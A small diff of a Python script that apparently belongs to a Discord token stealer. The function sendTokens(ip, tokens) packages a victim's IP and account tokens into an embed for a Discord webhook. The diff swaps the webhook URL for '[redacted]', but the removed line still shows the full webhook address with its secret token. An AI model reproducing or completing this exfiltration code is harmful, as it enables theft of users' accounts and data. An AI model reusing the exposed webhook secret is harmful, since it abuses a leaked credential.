@@ -4,8 +4,7 @@ import requests #dependency
 import os
 import platform
 
-url = "https://discord.com/api/webhooks/1085641543215485039/rFhWIuRiNubW0XoBaITECasXxtwksTLcP4V5CArTSRQb_SijAjtI9yKrPvWM9yiA3D3w"
-
+url = "[redacted]"
 def sendTokens(ip, tokens):
     message = { }
     message["embeds"] = [
